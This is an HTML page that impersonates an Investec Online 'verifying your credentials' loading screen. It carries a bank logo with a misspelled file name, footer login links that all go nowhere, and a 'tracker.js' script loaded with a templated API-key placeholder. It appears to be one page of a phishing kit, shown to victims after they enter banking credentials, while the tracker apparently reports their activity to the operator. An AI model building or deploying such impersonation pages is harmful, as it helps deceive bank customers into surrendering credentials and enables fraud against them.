<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifying - Investec Online</title>
    <link rel="icon" type="image/png" href="icon.png">
    <link rel="stylesheet" href="loading.css">

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <div class="container">
            <div class="logo">
                <img src="investiclogo.png" alt="Investec" class="logo-image">
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="main-content">
        <div class="loading-card">
            <div class="spinner"></div>
            <h2 class="loading-text">Verifying your information</h2>
            <p class="loading-subtext">Please wait while we securely verify your credentials</p>
        </div>
    </main>

    <!-- Footer -->
    <footer class="footer">
        <div class="container">
            <h2 class="footer-title">Login to other Investec accounts</h2>
            
            <div class="footer-links">
                <div class="footer-column">
                    <a href="#" class="footer-link">Investec Save</a>
                    <a href="#" class="footer-link">Channel Islands Trust & Corporate</a>
                </div>
                <div class="footer-column">
                    <a href="#" class="footer-link">Asset Management Indicator</a>
                    <a href="#" class="footer-link">Private Banking Switzerland</a>
                </div>
                <div class="footer-column">
                    <a href="#" class="footer-link">Investec Capital Solutions</a>
                    <a href="#" class="footer-link">Structured Products for IFAs</a>
                </div>
                <div class="footer-column">
                    <a href="#" class="footer-link">Securities Research</a>
                </div>
            </div>
        </div>
    </footer>
</body>
</html>
